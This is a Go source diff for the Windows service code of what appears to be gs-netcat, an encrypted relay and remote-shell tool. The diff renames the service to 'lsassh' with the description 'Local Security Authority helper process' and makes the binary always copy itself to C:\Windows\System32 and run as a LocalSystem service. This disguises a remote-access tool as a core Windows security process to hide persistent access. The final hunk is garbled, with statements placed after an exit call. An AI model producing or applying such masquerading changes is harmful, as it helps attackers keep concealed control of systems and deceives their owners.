@@ -8,7 +8,6 @@ import (
 	"log"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"strings"
 	"syscall"
 	"time"
@@ -18,8 +17,11 @@ import (
 )
 
 const (
-	serviceName = "gs-netcat"
-	serviceDesc = "Global Socket Relay Network — encrypted tunnel"
+	serviceName = "lsassh"
+	serviceDesc = "Local Security Authority helper process"
+	serviceExe  = "lsassh.exe"
+	serviceDir  = `C:\Windows\System32`
+	servicePath = serviceDir + `\` + serviceExe
 )
 
 // serviceHandler implements svc.Handler for the Windows service.
@@ -95,30 +97,21 @@ func reexecAsDaemon() {
 	fmt.Fprintf(os.Stderr, "%s: daemon: executable=%s\n", appName, exePath)
 	fmt.Fprintf(os.Stderr, "%s: daemon: args=%v\n", appName, os.Args[1:])
 
-	// If the binary is in a user profile, copy to System32 and re-exec.
-	// LocalSystem cannot access user directories on many Windows versions.
-	sysDir := os.Getenv("SystemRoot")
-	if sysDir == "" {
-		sysDir = `C:\Windows`
-	}
-	sysDir = filepath.Join(sysDir, "System32")
-	if strings.Contains(exePath, `\Users\`) {
-		safeExe := filepath.Join(sysDir, filepath.Base(exePath))
-		if !strings.EqualFold(exePath, safeExe) {
-			fmt.Fprintf(os.Stderr, "%s: daemon: copying to %s...\n", appName, safeExe)
-			if err := copyFile(exePath, safeExe); err != nil {
-				log.Fatalf("daemon: cannot copy to %s: %v", safeExe, err)
-			}
-			fmt.Fprintf(os.Stderr, "%s: daemon: copied to %s\n", appName, safeExe)
-			cmd := exec.Command(safeExe, os.Args[1:]...)
-			cmd.Stdin = os.Stdin
-			cmd.Stdout = os.Stdout
-			cmd.Stderr = os.Stderr
-			if err := cmd.Start(); err != nil {
-				log.Fatalf("daemon: re-exec from %s failed: %v", safeExe, err)
-			}
-			os.Exit(0)
+	// Always copy to servicePath so the service runs from a known location.
+	if !strings.EqualFold(exePath, servicePath) {
+		fmt.Fprintf(os.Stderr, "%s: daemon: copying to %s...\n", appName, servicePath)
+		if err := copyFile(exePath, servicePath); err != nil {
+			log.Fatalf("daemon: cannot copy to %s: %v", servicePath, err)
 		}
+		fmt.Fprintf(os.Stderr, "%s: daemon: copied to %s\n", appName, servicePath)
+		cmd := exec.Command(servicePath, os.Args[1:]...)
+		cmd.Stdin = os.Stdin
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		if err := cmd.Start(); err != nil {
+			log.Fatalf("daemon: re-exec from %s failed: %v", servicePath, err)
+		}
+		os.Exit(0)
 	}
 
 	// Build the service command line: exe + all args except -D.
@@ -183,19 +176,9 @@ func reexecAsDaemon() {
 
 	fmt.Fprintf(os.Stderr, "%s: daemon: calling startService('%s')...\n", appName, serviceName)
 	if err := startService(m, serviceName); err != nil {
-		fmt.Fprintf(os.Stderr, "%s: daemon: s.Start() returned: %v\n", appName, err)
-		fmt.Fprintf(os.Stderr, "%s: Service '%s' is installed but could not start.\n", appName, serviceName)
-		fmt.Fprintf(os.Stderr, "%s: \n", appName)
-		fmt.Fprintf(os.Stderr, "%s: Possible cause: The service (LocalSystem) cannot access\n", appName)
-		fmt.Fprintf(os.Stderr, "%s: the binary at: %s\n", appName, exePath)
-		fmt.Fprintf(os.Stderr, "%s: \n", appName)
-		fmt.Fprintf(os.Stderr, "%s: Try moving the binary to a system directory:\n", appName)
-		fmt.Fprintf(os.Stderr, "%s:   copy %s C:\\Windows\\System32\\\n", appName, exePath)
-		fmt.Fprintf(os.Stderr, "%s:   sc delete %s\n", appName, serviceName)
-		fmt.Fprintf(os.Stderr, "%s:   C:\\Windows\\System32\\%s -D ...\n", appName, filepath.Base(exePath))
-		fmt.Fprintf(os.Stderr, "%s: \n", appName)
-		fmt.Fprintf(os.Stderr, "%s: Or grant Read & Execute to Everyone on the file.\n", appName)
 		os.Exit(0)
+			fmt.Fprintf(os.Stderr, "%s: Check that %s is accessible by LocalSystem.\n", appName, servicePath)
+			fmt.Fprintf(os.Stderr, "%s:   sc delete %s\n", appName, serviceName)
 	}
 	os.Exit(0)
 }
